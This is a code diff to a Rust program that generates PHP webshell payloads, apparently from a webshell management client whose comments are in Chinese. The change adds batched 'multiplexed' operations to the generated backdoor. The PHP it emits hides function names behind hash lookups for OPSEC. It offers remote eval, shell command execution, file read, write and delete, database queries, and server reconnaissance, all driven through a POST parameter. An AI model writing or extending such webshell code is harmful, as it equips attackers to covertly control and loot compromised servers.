@@ -1714,27 +1714,22 @@ fn build_session_handler() -> String {
     // OPSEC：敏感函数名一律经**随代码自带**的 crc32b 符号表调用（见
     // `php_impl::php_symbol_table`）。表在这里构建而不是复用目标 stub 的 `$_g`：
     // 处理器每次连接由客户端注入，而部署在目标上的 stub 可能是旧版本、没有新索引。
+    //
+    // 结构：`<prefix>once($req)` 是单次操作分发（单调用与批量共用），
+    // `run($p)` 只负责信封解析、批量循环与帧收尾 —— 多路复用因此不需要
+    // 在目标上多发一次 HTTP 往返。
     let sym = format!("{}g", php_ident());
+    let once = format!("{}once", php_ident());
     let mut code = String::from("// DswSesInit\n");
     code.push_str(php_impl::PHP_REDIS_HELPERS);
     code.push_str(&php_impl::php_symbol_table(&format!("$GLOBALS['{sym}']")));
     code.push_str(&format!(
-        "function run($p) {{\n$__g =& $GLOBALS['{sym}'];\n"
+        "function {once}($req) {{\n$__g =& $GLOBALS['{sym}'];\n\
+         $a=isset($req['a'])?(string)$req['a']:'';\n\
+         $r=array('ok'=>true,'data'=>array());\n"
     ));
     code.push_str(
-        r#"$req=@json_decode($p,true);
-$n=is_array($req)&&isset($req['n'])?(string)$req['n']:'abababab';
-$gz=false;
-if(is_array($req)&&isset($req['z'])){
-$gz=true;
-$__in=(isset($__g[23])&&isset($__g[5]))?@$__g[23](@$__g[5]((string)$req['d'])):false;
-$req=is_string($__in)?@json_decode($__in,true):null;
-}
-if(!is_array($req)){return $n.(isset($__g[6])?@$__g[6]('{"ok":false,"error":"bad params"}'):'').$n;}
-$n=isset($req['n'])?(string)$req['n']:$n;
-$a=isset($req['a'])?(string)$req['a']:'';
-$r=array('ok'=>true,'data'=>array());
-if($a==='probe'){
+        r#"if($a==='probe'){
 "#,
     );
     code.push_str(php_impl::PHP_INFO_IMPL);
@@ -1764,8 +1759,7 @@ catch(Throwable $__t){{$r['data']=(string)ob_get_clean();$r['ok']=false;$r['erro
         p = eval_prefix()
     ));
     code.push_str(
-        r#"}
-elseif($a==='list'){
+        r#"}elseif($a==='list'){
 $p=isset($req['p'])?(string)$req['p']:'.';
 "#,
     );
@@ -1806,13 +1800,36 @@ $c=isset($req['c'])?(string)$req['c']:'';$q=isset($req['q'])?(string)$req['q']:'
     );
     code.push_str(php_impl::PHP_DB_QUERY_IMPL);
     code.push_str(
-        r#"if($ok){$r['data']=array('columns'=>$columns,'rows'=>$rows,'affected'=>$affected);}else{$r['ok']=false;$r['error']=$err;}
+        &r#"if($ok){$r['data']=array('columns'=>$columns,'rows'=>$rows,'affected'=>$affected);}else{$r['ok']=false;$r['error']=$err;}
+}
+return $r;
+}
+function run($p) {
+$__g =& $GLOBALS['SYM'];
+$req=@json_decode($p,true);
+$n=is_array($req)&&isset($req['n'])?(string)$req['n']:'abababab';
+$gz=false;
+if(is_array($req)&&isset($req['z'])){
+$gz=true;
+$__in=(isset($__g[23])&&isset($__g[5]))?@$__g[23](@$__g[5]((string)$req['d'])):false;
+$req=is_string($__in)?@json_decode($__in,true):null;
+}
+if(!is_array($req)){return $n.(isset($__g[6])?@$__g[6]('{"ok":false,"error":"bad params"}'):'').$n;}
+$n=isset($req['n'])?(string)$req['n']:$n;
+if(isset($req['a'])&&(string)$req['a']==='batch'){
+$__res=array();$__ops=isset($req['ops'])?$req['ops']:array();
+if(is_array($__ops)){foreach($__ops as $__op){$__res[]=ONCE(is_array($__op)?$__op:array());}}
+$r=array('ok'=>true,'data'=>array('results'=>$__res));
+}else{
+$r=ONCE($req);
 }
 $__j=json_encode($r);
 if($gz&&strlen($__j)>512&&isset($__g[24])){$__j=@$__g[24]($__j,6);}
 return $n.(isset($__g[6])?@$__g[6]($__j):'').$n;
 }
-"#,
+"#
+        .replace("SYM", &sym)
+        .replace("ONCE", &once)
     );
     code
 }
@@ -1942,7 +1959,7 @@ function __DROP__($p){global $_g;$ok=@$_g[6]($p)?@$_g[10]($p):@$_g[9]($p);return
 function __MOVE__($f,$t){global $_g;return @$_g[11]($f,$t)?'{"ok":true,"data":null}':'{"ok":false,"error":"rename failed"}';}
 function __MKDIR__($p){global $_g;return @$_g[12]($p,0755,true)?'{"ok":true,"data":null}':'{"ok":false,"error":"mkdir failed"}';}
 function __TOUCH__($p,$t){return @touch($p,(int)$t)?'{"ok":true,"data":null}':'{"ok":false,"error":"touch failed"}';}
-function __ENV__(){global $_g;$d=@$_g[13]();return json_encode(array('ok'=>true,'data'=>array('server'=>@$_g[14]('s').' '.@$_g[14]('r').' '.@$_g[14]('m'),'web_server'=>@$_SERVER['SERVER_SOFTWARE'],'php_version'=>PHP_VERSION,'current_dir'=>$d===false?'':$d,'separator'=>DIRECTORY_SEPARATOR,'php_sapi'=>PHP_SAPI,'arch'=>@$_g[14]('m'),'extensions'=>array_slice(@get_loaded_extensions(),0,16),'disable_functions'=>''.@ini_get('disable_functions'),'info'=>array('ChunkedTransfer'=>'1','ProtoVersion'=>'2','Capabilities'=>'chunked,stream,db,plugin,exec,gzip_plain','ShellType'=>'file','OsInfo'=>@$_g[14]('s').' '.@$_g[14]('r').' '.@$_g[14]('m'),'CurrentUser'=>''.@get_current_user(),'REMOTE_ADDR'=>''.@$_SERVER['REMOTE_ADDR'],'REMOTE_PORT'=>''.@$_SERVER['REMOTE_PORT'],'HTTP_X_FORWARDED_FOR'=>''.@$_SERVER['HTTP_X_FORWARDED_FOR'],'HTTP_CLIENT_IP'=>''.@$_SERVER['HTTP_CLIENT_IP'],'SERVER_ADDR'=>''.@$_SERVER['SERVER_ADDR'],'SERVER_NAME'=>''.@$_SERVER['SERVER_NAME'],'SERVER_PORT'=>''.@$_SERVER['SERVER_PORT'],'disable_functions'=>''.@ini_get('disable_functions'),'Open_basedir'=>''.@ini_get('open_basedir'),'timezone'=>''.@date_default_timezone_get(),'encode'=>''.@ini_get('default_charset'),'extension_dir'=>''.@ini_get('extension_dir'),'Path'=>''.@getenv('PATH'),'PATHEXT'=>''.@getenv('PATHEXT'),'APPDATA'=>''.@getenv('APPDATA'),'systempdir'=>''.@sys_get_temp_dir().'/','include_path'=>''.@ini_get('include_path'),'DOCUMENT_ROOT'=>''.@$_SERVER['DOCUMENT_ROOT'],'PHP_SAPI'=>PHP_SAPI,'PHP_VERSION'=>PHP_VERSION,'PHP_INT_SIZE'=>PHP_INT_SIZE,'ProcessArch'=>(PHP_INT_SIZE===8?'x64':'x86'),'PHP_OS'=>PHP_OS,'canCallGzipDecode'=>function_exists('gzdecode')?1:0,'canCallGzipEncode'=>function_exists('gzencode')?1:0,'session_name'=>''.@session_name(),'session_save_path'=>''.@ini_get('session.save_path'),'session_save_handler'=>''.@ini_get('session.save_handler'),'session_serialize_handler'=>''.@ini_get('session.serialize_handler'),'user_ini_filename'=>''.@ini_get('user_ini.filename'),'memory_limit'=>''.@ini_get('memory_limit'),'upload_max_filesize'=>''.@ini_get('upload_max_filesize'),'post_max_size'=>''.@ini_get('post_max_size'),'max_execution_time'=>''.@ini_get('max_execution_time'),'max_input_time'=>''.@ini_get('max_input_time'),'default_socket_timeout'=>''.@ini_get('default_socket_timeout'),'mygid'=>function_exists('posix_getgid')?''.@posix_getgid():'','mypid'=>''.@getmypid(),'SERVER_SOFTWARE'=>''.@$_SERVER['SERVER_SOFTWARE'],'loaded_extensions'=>implode(',',@get_loaded_extensions()),'short_open_tag'=>''.@ini_get('short_open_tag'),'asp_tags'=>''.@ini_get('asp_tags'),'safe_mode'=>''.@ini_get('safe_mode'),'CurrentDir'=>$d===false?'':$d,'FileRoot'=>''.@$_SERVER['DOCUMENT_ROOT']))));}
+function __ENV__(){global $_g;$d=@$_g[13]();return json_encode(array('ok'=>true,'data'=>array('server'=>@$_g[14]('s').' '.@$_g[14]('r').' '.@$_g[14]('m'),'web_server'=>@$_SERVER['SERVER_SOFTWARE'],'php_version'=>PHP_VERSION,'current_dir'=>$d===false?'':$d,'separator'=>DIRECTORY_SEPARATOR,'php_sapi'=>PHP_SAPI,'arch'=>@$_g[14]('m'),'extensions'=>array_slice(@get_loaded_extensions(),0,16),'disable_functions'=>''.@ini_get('disable_functions'),'info'=>array('ChunkedTransfer'=>'1','ProtoVersion'=>'2','Capabilities'=>'chunked,stream,db,plugin,exec,batch,gzip_plain','ShellType'=>'file','OsInfo'=>@$_g[14]('s').' '.@$_g[14]('r').' '.@$_g[14]('m'),'CurrentUser'=>''.@get_current_user(),'REMOTE_ADDR'=>''.@$_SERVER['REMOTE_ADDR'],'REMOTE_PORT'=>''.@$_SERVER['REMOTE_PORT'],'HTTP_X_FORWARDED_FOR'=>''.@$_SERVER['HTTP_X_FORWARDED_FOR'],'HTTP_CLIENT_IP'=>''.@$_SERVER['HTTP_CLIENT_IP'],'SERVER_ADDR'=>''.@$_SERVER['SERVER_ADDR'],'SERVER_NAME'=>''.@$_SERVER['SERVER_NAME'],'SERVER_PORT'=>''.@$_SERVER['SERVER_PORT'],'disable_functions'=>''.@ini_get('disable_functions'),'Open_basedir'=>''.@ini_get('open_basedir'),'timezone'=>''.@date_default_timezone_get(),'encode'=>''.@ini_get('default_charset'),'extension_dir'=>''.@ini_get('extension_dir'),'Path'=>''.@getenv('PATH'),'PATHEXT'=>''.@getenv('PATHEXT'),'APPDATA'=>''.@getenv('APPDATA'),'systempdir'=>''.@sys_get_temp_dir().'/','include_path'=>''.@ini_get('include_path'),'DOCUMENT_ROOT'=>''.@$_SERVER['DOCUMENT_ROOT'],'PHP_SAPI'=>PHP_SAPI,'PHP_VERSION'=>PHP_VERSION,'PHP_INT_SIZE'=>PHP_INT_SIZE,'ProcessArch'=>(PHP_INT_SIZE===8?'x64':'x86'),'PHP_OS'=>PHP_OS,'canCallGzipDecode'=>function_exists('gzdecode')?1:0,'canCallGzipEncode'=>function_exists('gzencode')?1:0,'session_name'=>''.@session_name(),'session_save_path'=>''.@ini_get('session.save_path'),'session_save_handler'=>''.@ini_get('session.save_handler'),'session_serialize_handler'=>''.@ini_get('session.serialize_handler'),'user_ini_filename'=>''.@ini_get('user_ini.filename'),'memory_limit'=>''.@ini_get('memory_limit'),'upload_max_filesize'=>''.@ini_get('upload_max_filesize'),'post_max_size'=>''.@ini_get('post_max_size'),'max_execution_time'=>''.@ini_get('max_execution_time'),'max_input_time'=>''.@ini_get('max_input_time'),'default_socket_timeout'=>''.@ini_get('default_socket_timeout'),'mygid'=>function_exists('posix_getgid')?''.@posix_getgid():'','mypid'=>''.@getmypid(),'SERVER_SOFTWARE'=>''.@$_SERVER['SERVER_SOFTWARE'],'loaded_extensions'=>implode(',',@get_loaded_extensions()),'short_open_tag'=>''.@ini_get('short_open_tag'),'asp_tags'=>''.@ini_get('asp_tags'),'safe_mode'=>''.@ini_get('safe_mode'),'CurrentDir'=>$d===false?'':$d,'FileRoot'=>''.@$_SERVER['DOCUMENT_ROOT']))));}
 function __EVALFN__($c){if($c==='')return '{"ok":false,"error":"empty"}';try{ob_start();@eval($c);$o=ob_get_clean();return json_encode(array('ok'=>true,'data'=>$o));}catch(Throwable $t){return json_encode(array('ok'=>false,'error'=>$t->getMessage()));}}
 function __DBP__($c){
 $p=@json_decode($c,true);if(!is_array($p))return '{"ok":false,"error":"bad conn"}';
@@ -2055,6 +2072,30 @@ try{
     return json_encode(array('ok'=>true,'data'=>array('columns'=>array(),'rows'=>array(),'affected'=>$st->rowCount())));
 }catch(Exception $e){return '{"ok":false,"error":"'.$e->getMessage().'"}';}
 }
+/* 操作分发表：单次调用与批量（多路复用）共用同一份分发逻辑 */
+function __RUN__($req){
+    $m=isset($req['a'])?(string)$req['a']:'';
+    $h=intval(substr(md5($m),0,8),16);
+    if($h==__H_PROBE__){return __ENV__();}
+    if($h==__H_EVAL__){return __EVALFN__(isset($req['c'])?(string)$req['c']:'');}
+    if($h==__H_EXEC__){return __CMD__(isset($req['c'])?(string)$req['c']:'',isset($req['w'])?(string)$req['w']:'');}
+    if($h==__H_LIST__){return __SCAN__(isset($req['p'])?(string)$req['p']:'.');}
+    if($h==__H_READ__){return __FETCH__(isset($req['p'])?(string)$req['p']:'',isset($req['o'])?(int)$req['o']:0,isset($req['l'])?(int)$req['l']:0);}
+    if($h==__H_WRITE__){return __STORE__(isset($req['p'])?(string)$req['p']:'',isset($req['d'])?(string)$req['d']:'',isset($req['o'])?(int)$req['o']:0);}
+    if($h==__H_DELETE__){return __DROP__(isset($req['p'])?(string)$req['p']:'');}
+    if($h==__H_RENAME__){return __MOVE__(isset($req['f'])?(string)$req['f']:'',isset($req['t'])?(string)$req['t']:'');}
+    if($h==__H_MKDIR__){return __MKDIR__(isset($req['p'])?(string)$req['p']:'');}
+    if($h==__H_TOUCH__){return __TOUCH__(isset($req['p'])?(string)$req['p']:'',isset($req['t'])?$req['t']:time());}
+    if($h==__H_DBPROBE__){return __DBP__(isset($req['c'])?(string)$req['c']:'');}
+    if($h==__H_DBQUERY__){return __DBQ__(isset($req['c'])?(string)$req['c']:'',isset($req['q'])?(string)$req['q']:'');}
+    return '{"ok":false,"error":"unsupported"}';
+}
+/* 多路复用：一次往返执行多个逻辑调用（逐项失败不影响其余） */
+function __BATCH__($ops){
+    $res=array();
+    if(is_array($ops)){foreach($ops as $op){$one=@json_decode(__RUN__(is_array($op)?$op:array()),true);$res[]=is_array($one)?$one:array('ok'=>false,'error'=>'bad result');}}
+    return json_encode(array('ok'=>true,'data'=>array('results'=>$res)));
+}
 /* 入口：接收上报数据 */
 if(isset($_POST['__PARAM__'])){
     $b=is_string($_POST['__PARAM__'])?$_POST['__PARAM__']:'';
@@ -2073,23 +2114,8 @@ if(isset($_POST['__PARAM__'])){
         if(is_string($__u)){$req=@json_decode($__u,true);$gz=1;}
     }
     if(!is_array($req)){$out='{"ok":false,"error":"bad params"}';}
-    else{
-        $m=isset($req['a'])?(string)$req['a']:'';
-        $h=intval(substr(md5($m),0,8),16);
-        $out='{"ok":false,"error":"unsupported"}';
-        if($h==__H_PROBE__){$out=__ENV__();}
-        elseif($h==__H_EVAL__){$out=__EVALFN__(isset($req['c'])?(string)$req['c']:'');}
-        elseif($h==__H_EXEC__){$out=__CMD__(isset($req['c'])?(string)$req['c']:'',isset($req['w'])?(string)$req['w']:'');}
-        elseif($h==__H_LIST__){$out=__SCAN__(isset($req['p'])?(string)$req['p']:'.');}
-        elseif($h==__H_READ__){$out=__FETCH__(isset($req['p'])?(string)$req['p']:'',isset($req['o'])?(int)$req['o']:0,isset($req['l'])?(int)$req['l']:0);}
-        elseif($h==__H_WRITE__){$out=__STORE__(isset($req['p'])?(string)$req['p']:'',isset($req['d'])?(string)$req['d']:'',isset($req['o'])?(int)$req['o']:0);}
-        elseif($h==__H_DELETE__){$out=__DROP__(isset($req['p'])?(string)$req['p']:'');}
-        elseif($h==__H_RENAME__){$out=__MOVE__(isset($req['f'])?(string)$req['f']:'',isset($req['t'])?(string)$req['t']:'');}
-        elseif($h==__H_MKDIR__){$out=__MKDIR__(isset($req['p'])?(string)$req['p']:'');}
-        elseif($h==__H_TOUCH__){$out=__TOUCH__(isset($req['p'])?(string)$req['p']:'',isset($req['t'])?$req['t']:time());}
-        elseif($h==__H_DBPROBE__){$out=__DBP__(isset($req['c'])?(string)$req['c']:'');}
-        elseif($h==__H_DBQUERY__){$out=__DBQ__(isset($req['c'])?(string)$req['c']:'',isset($req['q'])?(string)$req['q']:'');}
-    }
+    elseif(isset($req['a'])&&(string)$req['a']==='batch'){$out=__BATCH__(isset($req['ops'])?$req['ops']:array());}
+    else{$out=__RUN__($req);}
     /* 传输压缩（gzip）：请求用了明文层信封时，响应也在**明文层**压缩，
        客户端按 gzip 魔数识别（无需额外标记）。旧 stub 的密文层响应压缩不再生成。 */
     if($gz&&function_exists('gzencode')&&strlen($out)>512){$out=@gzencode($out,6);}
@@ -3199,7 +3225,7 @@ mod tests {
             "SELECT datname FROM pg_database",
             "SELECT username FROM all_users",
             "SHOW DATABASES",
-            "chunked,stream,db,plugin,exec,gzip_plain",
+            "chunked,stream,db,plugin,exec,batch,gzip_plain",
         ] {
             assert!(handler.contains(marker), "处理器缺少：{marker}");
             assert!(native.contains(marker), "NATIVE stub 缺少：{marker}");
